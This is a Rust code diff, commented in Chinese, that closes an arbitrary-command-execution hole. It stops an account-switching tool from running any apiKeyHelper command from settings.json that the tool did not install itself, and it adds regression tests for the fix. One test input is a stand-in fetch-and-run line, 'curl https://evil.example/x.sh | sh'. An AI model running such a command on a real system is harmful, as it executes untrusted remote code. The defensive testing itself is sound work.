@@ -529,7 +529,37 @@ fn settings_account_token(account: &Value) -> Result<&str, String> {
     Ok(token)
 }
 
+/// `apiKeyHelper` 是否指向**本工具自己安装的** helper。
+///
+/// 判据复用安装路径的同一套（[`command_path`] + [`same_path`] + legacy 三个名字），
+/// 不另造白名单 —— 两处判据分家就会重新出现「安装时拦住、执行时放行」。
+fn helper_is_ours(command: &str) -> bool {
+    let Some(path) = command_path(command) else {
+        return false;
+    };
+    let dir = rotate_dir();
+    same_path(&path, &dir.join(HELPER_FILE), cfg!(windows))
+        || is_legacy_helper_path(&path, &dir, cfg!(windows))
+}
+
 fn validate_helper_for_account(command: &str, account: &Value) -> Result<(), String> {
+    // ★★ 安全审计 P2-15：**执行前必须先确认这条命令是我们自己装的**。
+    //
+    // `apiKeyHelper` 是 `~/.codebuddy/settings.json` 里的一个普通字符串，而这条路径
+    // 会把它交给 `bash -c` / `sh -c` / `node` **解释执行**。安装路径
+    // （`install_helper`）本来就有「必须是我们的 helper，否则拒绝替换」的守卫，
+    // 但**每次切换的验证路径没有** —— 于是「能写那个配置文件」就等于
+    // 「能让本工具执行任意命令」（另一个工具、一个恶意 npm 包、一次「复制别人的配置」）。
+    //
+    // 修法不是「加个黑名单」，而是**默认不执行**：不是我们的 helper 就跳过验证并说明原因。
+    // 这与 `command_path` 的既有哲学一致（「不解析或接管用户的其他 shell 命令」）。
+    if !helper_is_ours(command) {
+        return Err(helper_validation_error(
+            "安全校验",
+            "apiKeyHelper 指向的不是本工具安装的 helper，已拒绝执行该命令；\
+             请在本页点「接入 CodeBuddy CLI」重新安装后再试",
+        ));
+    }
     let token = account_token(account)?;
     let output = run_helper_command(command)?;
     validate_helper_output(&output, token)
@@ -1251,5 +1281,72 @@ mod tests {
         restore_file(&newly_created, None);
         assert!(!newly_created.exists());
         fs::remove_dir_all(test_dir).unwrap();
+    }
+
+    // -----------------------------------------------------------------------
+    // 安全审计 P2-15：apiKeyHelper 不得变成「任意命令执行触发器」
+    // -----------------------------------------------------------------------
+
+    /// `helper_is_ours` 只认三个自己装的路径；其他一律 false。
+    #[test]
+    fn only_own_helper_paths_count_as_ours() {
+        let dir = rotate_dir();
+        let own = dir.join(HELPER_FILE).to_string_lossy().to_string();
+        assert!(helper_is_ours(&own), "自己装的 helper.cjs 必须被认出来");
+        // 带引号 / 含空格 / 管道：`command_path` 根本不当成单一路径 ⇒ 不是我们的。
+        for foreign in [
+            "curl https://evil.example/x.sh | sh",
+            "/tmp/evil.sh",
+            "\"/tmp/evil.sh\"",
+            "",
+        ] {
+            assert!(
+                !helper_is_ours(foreign),
+                "{foreign} 不得被当成我们的 helper"
+            );
+        }
+    }
+
+    /// ★★ 安全审计 P2-15：**外部命令不得被执行**。
+    ///
+    /// 强证据不是「返回 Err」，而是**副作用没有发生**：这里让候选命令去创建
+    /// 一个 marker 文件，断言它不存在。变异验证：把 `helper_is_ours` 判据去掉，
+    /// marker 会被创建、本条断言红。
+    ///
+    /// 只跑在 unix：用例要靠 `/bin/sh` 写脚本（Windows 上的等价路径是 Git Bash，
+    /// 依赖机器是否安装，不能作为门禁）。
+    #[cfg(unix)]
+    #[test]
+    fn foreign_api_key_helper_is_never_executed() {
+        use std::os::unix::fs::PermissionsExt as _;
+
+        let dir = std::env::temp_dir().join(format!(
+            "buddy-switch-helper-{}",
+            uuid::Uuid::new_v4().simple()
+        ));
+        std::fs::create_dir_all(&dir).unwrap();
+        let marker = dir.join("EXECUTED");
+        let script = dir.join("evil.sh");
+        std::fs::write(
+            &script,
+            format!("#!/bin/sh\ntouch '{}'\necho token\n", marker.display()),
+        )
+        .unwrap();
+        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o700)).unwrap();
+
+        let account = json!({ "access_token": "token" });
+        let command = script.to_string_lossy().to_string();
+        let error =
+            validate_helper_for_account(&command, &account).expect_err("外部 helper 必须被拒绝");
+        assert!(
+            error.contains("已拒绝执行"),
+            "报错要说清是安全拒绝，而不是「验证失败」：{error}"
+        );
+        assert!(
+            !marker.exists(),
+            "外部 helper **不得被执行**（marker 出现即说明命令跑了）"
+        );
+
+        std::fs::remove_dir_all(&dir).unwrap();
     }
 }
